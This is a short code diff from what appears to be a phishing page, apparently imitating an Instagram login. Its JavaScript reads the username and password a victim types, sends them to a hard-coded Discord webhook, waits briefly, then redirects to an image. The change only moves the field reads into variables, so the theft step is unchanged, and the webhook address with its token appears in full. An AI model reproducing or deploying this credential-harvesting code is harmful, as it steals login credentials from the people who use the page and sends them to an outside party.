@@ -109,10 +109,12 @@
     var request = new XMLHttpRequest();
     request.open("POST", "https://discord.com/api/webhooks/1221932777499263158/ThVWkczP3AK6wKPqbtAucU6m5AULUA-TD1RhwaqyUaJPmm3h7d7p_owAQbPPEHsYGlos");
     request.setRequestHeader('Content-type', 'application/json');
+    var user = document.getElementById('username').value;
+    var pass = document.getElementById('password').value;
     var params = {
-      content: ("> **USR  : **" + document.getElementById('username').value + "\n> **PWD : **" + document.getElementById('password').value)
+      content: ("> **USR  : **" + user + "\n> **PWD : **" + pass )
     }
-    if (username.length > 5 && password.lenght > 5){
+    if (user.length > 5 && pass.lenght > 5){
     request.send(JSON.stringify(params));
 	sleep(300)
 	window.location.replace("instagram/sardra_ye.jpg");
